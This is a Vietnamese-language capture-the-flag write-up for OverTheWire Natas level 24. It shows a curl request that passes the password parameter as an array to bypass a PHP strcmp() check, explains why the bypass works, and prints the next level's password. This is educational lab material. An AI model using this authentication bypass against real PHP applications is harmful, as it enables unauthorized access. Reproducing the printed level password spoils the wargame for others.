# Natas 24 → 25

## Mục tiêu

Lấy password của `natas25` qua `strcmp()` với input không phải string.

## Tôi thấy

Source gọi `strcmp($_REQUEST["passwd"], "<censored>")`. PHP cảnh báo và trả giá trị không khác 0 khi input là array.

## Cách làm

```bash
curl -u natas24:<password> \
  'http://natas24.natas.labs.overthewire.org/?passwd[]=x'
```

## Vì sao cách này hiệu quả

`passwd[]` khiến PHP tạo array. Điều kiện `!strcmp(...)` trở thành đúng do lỗi xử lý kiểu và response trả credentials.

## Kết quả

Password của `natas25`:

```text
UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo
```

